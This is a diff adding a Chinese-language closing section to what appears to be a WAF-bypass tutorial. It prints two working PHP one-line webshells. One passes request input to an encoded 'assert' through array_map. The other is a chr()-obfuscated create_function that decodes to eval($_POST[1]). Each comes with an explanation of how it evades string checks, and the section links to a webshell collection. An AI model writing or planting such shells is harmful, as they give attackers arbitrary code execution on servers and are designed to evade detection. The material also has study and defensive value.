@@ -148,5 +148,24 @@ Payload:
 
 ![](pic/tencent-WAF-$_COOKIE-bypass.png)
 
-  
+### 文末总结
+
+  到了这里,举一些不错的一句话木马来分析一下原理,推荐深入研究的读者访问这里[Link](https://github.com/tennc/webshell/tree/master/php)
+
+1.
+
+```PHP
+    <?php array_map("ass\x65rt",(array)$_REQUEST['expdoor']);?>
+```
+
+  这个WebShell 使用到`array_map()` 和`ass\x65rt` ,array_map() 是调用函数的,第一个参数是即将要调用的函数名,这里`ass\x65rt` 使用了编码绕过,绕过了字符串判断,第二个参数是传递给这个函数的参数
+
+2.
+
+```PHP
+    <?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>
+
+```
+  这个WebShell 使用到了间接引用函数,$_uU 重定向到chr() ,;$_cC 最后解码为`eval($_POST[1]);` ,$_fF 解码为`create_function` ,最后就是create_function 的调用过程,和php-shell-create_function.php 原理一样
+
 
